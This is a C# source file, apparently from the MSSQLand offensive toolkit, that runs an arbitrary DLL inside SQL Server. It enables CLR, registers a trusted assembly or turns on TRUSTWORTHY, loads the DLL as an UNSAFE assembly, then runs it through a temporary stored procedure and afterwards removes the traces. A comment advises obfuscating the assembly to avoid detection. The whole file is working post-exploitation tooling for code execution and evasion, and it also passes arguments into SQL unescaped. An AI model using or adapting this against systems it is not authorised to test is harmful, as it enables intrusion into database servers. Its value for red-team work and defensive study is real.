// MSSQLand/Actions/Execution/ClrExecution.cs

using MSSQLand.Services;
using MSSQLand.Utilities;
using System;

namespace MSSQLand.Actions.Execution
{
    /// <summary>
    /// Executes a CLR (Common Language Runtime) assembly within the SQL Server context.
    /// WARNING: The assembly used is written on disk at some point by sqlserver.exe, which may trigger detections. Use with caution and ensure the assembly is clean and obfuscated if necessary.
    /// Assemblies should contain functions callable from SQL Server, typically with a signature like:
    /// <code>
    /// public static void Exec(string args)
    /// </code>
    /// The SQL types available for parameters are limited, so complex data should be passed as a single string argument and parsed within the assembly.
    /// https://learn.microsoft.com/en-us/sql/relational-databases/clr-integration-database-objects-types-net-framework/mapping-clr-parameter-data?view=sql-server-ver17&tabs=csharp
    /// </summary>
    internal class ClrExecution : BaseAction
    {
        [ArgumentMetadata(Position = 0, Required = true, Description = "Local path to the DLL")]
        private string _dllURI = string.Empty;

        [ArgumentMetadata(Position = 1, Required = true, Description = "Class name containing the function to execute")]
        private string _className = string.Empty;

        [ArgumentMetadata(Position = 2, Required = true, Description = "Function name to execute")]
        private string _function = string.Empty;

        [ArgumentMetadata(Position = 3, Remainder = true, Description = "Function args")]
        private string _args = string.Empty;

        public override object Execute(DatabaseContext databaseContext)
        {
            // Step 1: Get the SHA-512 hash for the DLL and its bytes.
            string[] library = ByteHelper.ConvertDllToSqlBytes(_dllURI);

            if (library.Length != 2 || string.IsNullOrEmpty(library[0]) || string.IsNullOrEmpty(library[1]))
            {
                Logger.Error("Failed to convert DLL to SQL-compatible bytes.");
                return false;
            }

            if (!databaseContext.ConfigService.SetConfigurationOption("clr enabled", 1))
            {
                return false;
            }

            string libraryHash = library[0];
            string libraryHexBytes = library[1];

            Logger.Info($"SHA-512 Hash: {libraryHash}");
            Logger.Info($"DLL Bytes Length: {libraryHexBytes.Length}");

            string assemblyName = Guid.NewGuid().ToString("N").Substring(0, 6);
            string libraryPath = Guid.NewGuid().ToString("N").Substring(0, 6);

            string dropProcedure = $"DROP PROCEDURE IF EXISTS [{_function}];";
            string dropAssembly = $"DROP ASSEMBLY IF EXISTS [{assemblyName}];";
            string dropClrHash = $"EXEC sp_drop_trusted_assembly 0x{libraryHash};";
            bool usedTrustedAssembly = false;
            bool setTrustworthy = false;

            Logger.Task("Starting CLR assembly deployment process");

            try
            {
                // Strategy 1: Try sp_add_trusted_assembly (requires VIEW SERVER SECURITY STATE)
                // Strategy 2: Fall back to TRUSTWORTHY property (requires db_owner on a trustworthy-eligible database)
                if (!databaseContext.QueryService.ExecutionServer.IsLegacy)
                {
                    usedTrustedAssembly = databaseContext.ConfigService.RegisterTrustedAssembly(libraryHash, libraryPath);
                }

                if (!usedTrustedAssembly)
                {
                    Logger.Warning("Trusted assembly registration unavailable, falling back to TRUSTWORTHY");
                    // Check if database is already TRUSTWORTHY
                    object trustworthyResult = databaseContext.QueryService.ExecuteScalar(
                        $"SELECT is_trustworthy_on FROM sys.databases WHERE name = DB_NAME();");

                    bool isTrustworthy = trustworthyResult != null && Convert.ToBoolean(trustworthyResult);

                    if (!isTrustworthy)
                    {
                        Logger.Warning("Current database is not TRUSTWORTHY");
                        Logger.WarningNested("Attempting to enable it");
                        try
                        {
                            databaseContext.QueryService.ExecuteNonProcessing(
                                $"ALTER DATABASE [{databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY ON;");
                            setTrustworthy = true;
                            Logger.Success("TRUSTWORTHY enabled on current database");
                        }
                        catch (Exception ex)
                        {
                            Logger.Error($"Failed to enable TRUSTWORTHY: {ex.Message}");
                            return false;
                        }
                    }
                    else
                    {
                        Logger.Info("Database is already TRUSTWORTHY, using it for CLR deployment");
                    }
                }

                // Drop existing procedure and assembly if they exist
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);

                // Step 3: Create the assembly from the DLL bytes
                Logger.Task("Creating the assembly from DLL bytes");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE ASSEMBLY [{assemblyName}] FROM 0x{libraryHexBytes} WITH PERMISSION_SET = UNSAFE;");

                if (!databaseContext.ConfigService.CheckAssembly(assemblyName))
                {
                    Logger.Error("Failed to create a new assembly");
                    return false;
                }

                Logger.Success($"Assembly '{assemblyName}' successfully created");

                Logger.Task("Creating the stored procedure linked to the assembly");
                databaseContext.QueryService.ExecuteNonProcessing(
                    $"CREATE PROCEDURE [dbo].[{_function}] @args NVARCHAR(MAX) AS EXTERNAL NAME [{assemblyName}].[{_className}].[{_function}];");

                if (!databaseContext.ConfigService.CheckProcedures(_function))
                {
                    Logger.Error("Failed to create the stored procedure");
                    return false;
                }

                Logger.Success($"Stored procedure '{_function}' successfully created");

                // Step 5: Execute the stored procedure
                Logger.Task($"Executing the stored procedure '{_function}'");
                databaseContext.QueryService.ExecuteNonProcessing($"EXEC [{_function}] @args = '{_args}';");
                Logger.Success("Stored procedure executed successfully");

                return true;
            }
            catch (Exception ex)
            {
                Logger.Error($"Error during CLR assembly deployment: {ex.Message}");
                return false;
            }
            finally
            {
                // Cleanup (always executed)
                Logger.Task("Performing cleanup");
                databaseContext.QueryService.ExecuteNonProcessing(dropProcedure);
                databaseContext.QueryService.ExecuteNonProcessing(dropAssembly);

                if (usedTrustedAssembly)
                {
                    databaseContext.QueryService.ExecuteNonProcessing(dropClrHash);
                }

                if (setTrustworthy)
                {
                    Logger.Info("Resetting TRUSTWORTHY property");
                    databaseContext.QueryService.ExecuteNonProcessing(
                        $"ALTER DATABASE [{databaseContext.QueryService.ExecutionServer.Database}] SET TRUSTWORTHY OFF;");
                }
            }
        }
    }
}
